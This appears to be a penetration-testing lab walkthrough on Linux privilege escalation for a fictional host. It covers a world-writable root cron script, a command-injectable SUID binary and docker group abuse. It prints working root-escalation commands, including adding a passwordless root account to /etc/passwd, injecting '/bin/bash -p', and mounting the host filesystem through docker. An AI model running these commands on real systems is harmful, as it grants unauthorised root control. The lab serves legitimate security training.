Lab Overview

Privilege escalation is a critical post-exploitation technique. After obtaining low-privilege access, an attacker enumerates the system for misconfigurations that allow elevation to root. This lab covers three distinct privilege escalation paths found on SYNTEX-LNX01. You will identify each vulnerability, understand why it exists, and demonstrate exploitation. On a real CPSA engagement, each path would be a separate High-severity finding.

⚠️
This lab assumes you have a shell as the jsmith user on SYNTEX-LNX01 (password: Syntex2024! obtained from the SMB share in Lab F5-A). For CPSA purposes, documenting the vulnerability and its potential impact is sufficient - full exploitation is not always required.

Privilege Escalation Path 1: Writable Cron Script
Cron Job /opt/syntex_maintenance.sh - World-Writable Root Cron Critical
1
Find the Cron Job
▶

Check system-wide cron jobs that run as root.

# Check root's crontab
cat /etc/crontab

# Check cron.d entries
ls -la /etc/cron.d/
cat /etc/cron.d/*
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /opt/syntex_maintenance.sh
🚨
The script /opt/syntex_maintenance.sh runs every minute as root. Now we need to check its permissions.
2
Check Script Permissions
▶
ls -la /opt/syntex_maintenance.sh
-rwxrwxrwx 1 root root 156 Oct 18 2024 /opt/syntex_maintenance.sh

cat /opt/syntex_maintenance.sh
#!/bin/bash
# Syntex maintenance script
echo "Maintenance run at $(date)" >> /var/log/syntex_maintenance.log
/usr/bin/find /tmp -mtime +7 -delete
🚨
Permissions are -rwxrwxrwx (777). Any user on the system can overwrite this script. Since it runs as root every minute via cron, overwriting it with a malicious payload would result in root-level code execution.

To demonstrate the vulnerability (for documentation purposes), a real attacker would append a reverse shell or add a backdoor user. On a CPSA engagement, document the finding and move on - do not actually exploit unless explicitly in scope.

# Example proof-of-concept (demonstrate impact without exploitation):
# An attacker could run:
echo 'root2:x:0:0:root:/root:/bin/bash' >> /etc/passwd
# ...then wait 60 seconds for the cron to execute as root
# This would create a second root account with no password
Privilege Escalation Path 2: SUID Binary
SUID /usr/local/bin/syntex-backup - SUID Command Injection Critical
3
Find SUID Binaries
▶

SUID binaries run with the file owner's privileges rather than the caller's. Finding non-standard SUID binaries is a key privesc check.

# Find all SUID binaries on the system
find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/local/bin/syntex-backup
/bin/mount
/bin/umount
/bin/ping
⚠️
/usr/local/bin/syntex-backup is not a standard Linux binary. Any non-standard SUID binary warrants investigation. Standard SUID binaries (passwd, sudo, su, mount, ping) are expected; custom ones rarely are.
4
Analyse the SUID Binary
▶
ls -la /usr/local/bin/syntex-backup
-rwsr-xr-x 1 root root 16832 Oct 18 2024 /usr/local/bin/syntex-backup

# The 's' in the owner execute position = SUID bit set
# This binary runs as root regardless of who executes it

strings /usr/local/bin/syntex-backup
...
Backup directory: %s
tar -czf /var/backups/syntex_backup.tar.gz %s
Backup complete.
...
🚨
The binary passes user-supplied input to tar using system() or equivalent without sanitisation. If the binary accepts a directory argument and passes it to the shell, it is vulnerable to command injection via path manipulation or shell metacharacters.
# Proof-of-concept - command injection via semicolon (or $() subshell)
# An attacker would run:
/usr/local/bin/syntex-backup /tmp; /bin/bash -p
# The -p flag preserves the effective UID (root) in bash
# This would drop the attacker into a root shell
Privilege Escalation Path 3: Docker Group
Group Docker Group Membership - Container Escape to Root Critical
5
Understand the Docker Group Risk
▶

Being in the docker group is effectively equivalent to having passwordless sudo. Docker can mount the host filesystem into a container, allowing a low-privilege user to read and write root-owned files.

# Confirm docker group membership (already seen in 'id' output)
id
uid=1001(jsmith) gid=1001(jsmith) groups=1001(jsmith),999(docker)

# Check docker daemon is running
docker ps
CONTAINER ID   IMAGE   COMMAND   CREATED   STATUS   PORTS   NAMES
🚨
Docker daemon running and accessible to jsmith. The docker group attack technique mounts the host root filesystem into an alpine container, then writes to privileged files (e.g. /etc/passwd or /etc/sudoers) as root from within the container.
# Classic docker group privesc - mount host / into container:
docker run -it --rm -v /:/mnt alpine chroot /mnt sh
# This gives a root shell with full access to the host filesystem
# The container runs as root by default; /mnt is the host's /
# chroot into /mnt = operate directly on the host OS as root
ℹ️
This is documented in GTFOBins: docker - any member of the docker group can trivially escalate to root. The fix is to remove users from the docker group and use sudo with specific docker commands if needed, or use rootless Docker.
